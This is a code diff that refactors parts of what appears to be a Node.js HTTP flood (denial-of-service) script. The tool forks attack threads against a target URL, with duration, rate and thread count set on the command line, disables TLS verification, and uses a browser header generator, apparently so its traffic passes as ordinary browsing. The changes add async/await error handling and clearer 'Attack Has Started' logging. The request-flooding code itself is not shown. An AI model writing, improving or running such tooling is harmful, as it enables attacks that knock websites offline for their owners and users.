@@ -34,32 +34,31 @@ const getCurrentTime = () => {
  const targetURL = process.argv[2];
  const agent = new https.Agent({ rejectUnauthorized: false });
 
- function getStatus() {
- const timeoutPromise = new Promise((resolve, reject) => {
-   setTimeout(() => {
-     reject(new Error('Request timed out'));
-   }, 5000);
- });
+async function getStatus() {
+  const timeoutPromise = new Promise((resolve, reject) => {
+    setTimeout(() => {
+      reject(new Error('Request timed out'));
+    }, 5000);
+  });
 
- const axiosPromise = axios.get(targetURL, { httpsAgent: agent });
+  const axiosPromise = axios.get(targetURL, { httpsAgent: agent });
 
- Promise.race([axiosPromise, timeoutPromise])
-   .then((response) => {
-     const { status, data } = response;
-     //console.log(`[\x1b[35mnova\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
-   })
-   .catch((error) => {
-     if (error.message === 'Request timed out') {
-       console.log(`[\x1b[35mnova\x1b[0m] ${getCurrentTime()} Request Timed Out`);
-     } else if (error.response) {
-       const extractedTitle = getTitleFromHTML(error.response.data);
-       console.log(`[\x1b[35m\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
-     } else {
-       console.log(`[\x1b[35m\x1b[0m] ${getCurrentTime()} ${error.message}`);
-     }
-   });
+  try {
+    const response = await Promise.race([axiosPromise, timeoutPromise]);
+    const { status, data } = response;
+    const title = getTitleFromHTML(data);
+    console.log(`[INFO] ${getCurrentTime()} Title: ${title} (Status: ${status})`);
+  } catch (error) {
+    if (error.message === 'Request timed out') {
+      console.log(`[WARNING] ${getCurrentTime()} Request Timed Out`);
+    } else if (error.response) {
+      const extractedTitle = getTitleFromHTML(error.response.data);
+      console.log(`[ERROR] ${getCurrentTime()} Title: ${extractedTitle} (Status: ${error.response.status})`);
+    } else {
+      console.log(`[ERROR] ${getCurrentTime()} ${error.message}`);
+    }
+  }
 }
-
 
 function getTitleFromHTML(html) {
   const titleRegex = /<title>(.*?)<\/title>/i;
@@ -103,23 +102,27 @@ const args = {
 }
 
 
-if (cluster.isMaster){
- console.clear();
- console.log(`
-                                       
-`);
- console.log(`\x1b[96mSource code by asumi\x1b[0m`);
- for (let i = 1; i <= process.argv[5]; i++){
-   cluster.fork();
-   //console.log(`[\x1b[35m\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
- }
- console.log(`[\x1b[35m\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
- setInterval(getStatus, 2000);
- setTimeout(() => {
-   console.log(`[\x1b[35m\x1b[0m] ${getCurrentTime()} The Attack uda selesai wakku`);
-   process.exit(1);
- }, process.argv[3] * 1000);
-} 
+if (cluster.isMaster) {
+  console.clear();
+  console.log('Starting attack with the following parameters:');
+  console.log(`Target: ${args.target}`);
+  console.log(`Duration: ${args.time} seconds`);
+  console.log(`Rate: ${args.Rate} requests/second`);
+  console.log(`Threads: ${args.threads}`);
+
+  for (let i = 1; i <= args.threads; i++) {
+    cluster.fork();
+    console.log(`[INFO] ${getCurrentTime()} Attack Thread ${i} Started`);
+  }
+
+  console.log(`[INFO] ${getCurrentTime()} The Attack Has Started`);
+  setInterval(getStatus, 2000);
+
+  setTimeout(() => {
+    console.log(`[INFO] ${getCurrentTime()} The Attack Has Ended`);
+    process.exit(0);
+  }, args.time * 1000);
+}
 
 let headerGenerator = new HeaderGenerator({
    browsers: [
